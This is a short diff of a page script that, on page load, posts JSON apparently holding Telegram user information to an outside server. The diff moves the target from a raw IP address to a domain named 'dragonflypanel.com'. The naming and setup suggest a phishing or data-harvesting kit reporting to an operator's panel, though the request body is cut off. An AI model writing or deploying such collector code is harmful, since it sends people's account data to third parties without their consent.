@@ -17,7 +17,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
         alert("XXXD");
 
-        await fetch('http://94.131.9.66:4040/api/users/telegram/info', {
+        await fetch('https://dragonflypanel.com/api/telegram_info', {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
